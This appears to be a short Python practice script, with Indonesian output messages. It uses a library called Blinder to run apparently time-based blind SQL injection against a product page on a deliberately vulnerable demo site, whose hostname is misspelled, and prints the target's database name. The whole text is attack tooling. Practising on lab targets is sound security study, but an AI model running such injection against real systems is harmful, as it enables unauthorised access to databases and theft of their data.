import Blinder

blind = Blinder.blinder(
    "http://testphp.vulenweb.com/product.php?pic=1",
    sleep=1
)
print("[+] Database pada sasaran :",blind.get_database())


print("Database sasaran adalah:%s"%blind.get_database())




